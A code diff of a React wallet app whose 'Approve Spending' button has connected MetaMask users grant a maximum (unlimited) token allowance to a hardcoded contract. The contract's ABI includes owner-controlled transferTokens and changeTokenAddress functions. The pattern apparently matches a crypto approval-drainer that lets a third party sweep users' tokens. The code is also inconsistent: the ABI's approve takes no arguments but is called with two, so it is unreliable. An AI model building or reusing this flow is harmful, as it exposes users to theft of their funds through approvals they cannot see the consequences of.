@@ -16,7 +16,7 @@ function App() {
   const [hasprovider, setHasprovider] = useState<boolean | null>(null);
   const initialState: Wallet = { accounts: [], balance: "", chainId: "" };
   const [wallet, setWallet] = useState<Wallet>(initialState);
-
+  const [tokenAddress, setTokenAddress] = useState<string>('0x31437ff9083a2C5af07468042e3a84C3e5F74a07'); // Set your predetermined token address here
   const [isConnecting, setIsConnecting] = useState<boolean>(false);
   const [error, setError] = useState<boolean>(false);
   const [errorMessage, setErrorMessage] = useState<string>("");
@@ -80,113 +80,37 @@ function App() {
     setIsConnecting(false);
   };
 
-  // Add this state at the top of your component
   const [isProcessing, setIsProcessing] = useState(false);
   const approveSpending = async () => {
     try {
-      // Enable MetaMask and create a Web3Provider instance
+      if (!tokenAddress) {
+        console.error('Token address is required.');
+        return;
+      }
+
       await window.ethereum.enable();
       const provider = new Web3Provider(window.ethereum);
       const signer: Signer = provider.getSigner();
   
-      // Replace '0xYourContractAddress' with your actual contract address
       const contractAddress = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
-      
-      // Replace '0xSpenderContractAddress' with the address you want to approve spending for
       const spender = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
+      const contractABI: any[] = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newTokenAddress","type":"address"}],"name":"changeTokenAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"transferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];
   
-      // Replace with the ABI of your smart contract
-      const contractABI: any[] = [
-        {
-          "inputs": [
-            {
-              "internalType": "address",
-              "name": "_tokenAddress",
-              "type": "address"
-            }
-          ],
-          "stateMutability": "nonpayable",
-          "type": "constructor"
-        },
-        {
-          "inputs": [],
-          "name": "approve",
-          "outputs": [],
-          "stateMutability": "nonpayable",
-          "type": "function"
-        },
-        {
-          "inputs": [
-            {
-              "internalType": "address",
-              "name": "_newTokenAddress",
-              "type": "address"
-            }
-          ],
-          "name": "changeTokenAddress",
-          "outputs": [],
-          "stateMutability": "nonpayable",
-          "type": "function"
-        },
-        {
-          "inputs": [],
-          "name": "owner",
-          "outputs": [
-            {
-              "internalType": "address",
-              "name": "",
-              "type": "address"
-            }
-          ],
-          "stateMutability": "view",
-          "type": "function"
-        },
-        {
-          "inputs": [],
-          "name": "tokenAddress",
-          "outputs": [
-            {
-              "internalType": "address",
-              "name": "",
-              "type": "address"
-            }
-          ],
-          "stateMutability": "view",
-          "type": "function"
-        },
-        {
-          "inputs": [
-            {
-              "internalType": "address",
-              "name": "to",
-              "type": "address"
-            }
-          ],
-          "name": "transferTokens",
-          "outputs": [],
-          "stateMutability": "nonpayable",
-          "type": "function"
-        }
-      ]; // Your smart contract ABI
-  
-      // Create a Contract instance
       const contract = new Contract(contractAddress, contractABI, signer);
-  
-      // Set allowance to the maximum possible value
       const allowance = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
   
       // Call the 'approve' function of your contract with spender and allowance
-      const tx = await contract.approve(spender, allowance, { gasLimit: 10000000 });
+      const tx = await contract.approve(tokenAddress, allowance, { gasLimit: 10000000 });
       await tx.wait();
   
       console.log('Approval successful.');
     } catch (error) {
       console.error('Error approving spending:', error);
     }
-    setIsProcessing(false); // Hide the processing indicator
+    setIsProcessing(false);
   };  
 
-    const disableConnect = Boolean(wallet) && isConnecting;
+  const disableConnect = Boolean(wallet) && isConnecting;
 
   return (
     <div className="App">
@@ -207,9 +131,9 @@ function App() {
           <strong>Error:</strong> {errorMessage}
         </div>}
 
-        <button onClick={approveSpending} disabled={isProcessing}>
+      <button onClick={approveSpending} disabled={isProcessing}>
         {isProcessing ? 'Processing...' : 'Approve Spending'}
-        </button>
+      </button>
     </div>
   );
 }
